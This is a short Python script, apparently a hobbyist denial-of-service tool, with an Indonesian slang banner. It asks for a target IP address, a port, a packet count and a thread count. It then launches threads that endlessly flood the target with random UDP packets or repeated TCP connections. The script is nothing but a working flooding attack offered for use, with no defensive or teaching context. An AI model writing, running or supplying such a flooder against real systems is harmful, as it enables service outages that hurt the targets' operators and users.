#Nathan...
import random
import socket
import threading

print('''=========== TOOLS BY NATHAN ===========''')
print('''=========== YANG RENAME GW GEBUK ===========''')
print('''=========== JANGAN ABUSE YA BEB ===========''')
print('''=========== LOPYU <3 ===========''')

ip = str(input("IP NYA NGAB:"))
port = int(input("PORT NYA NGAB:"))
times = int(input("MAU BERAPA PAKETNYA:"))
threads = int(input("JUMLAH BARANGNYA BERAPA:"))
choice = str(input("GAS GAK NIH ? (y or n):"))
def run():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("[+] ENTODDDDDDDDD!!!")
		except:
			print("[=] YAMETEHHHH !!!")

def run2():
	data = random._urandom(150)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("[+] ENTODDDDDDDDD!!!")
		except:
			s.close()
			print("[=] YAMETEHHHH !!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
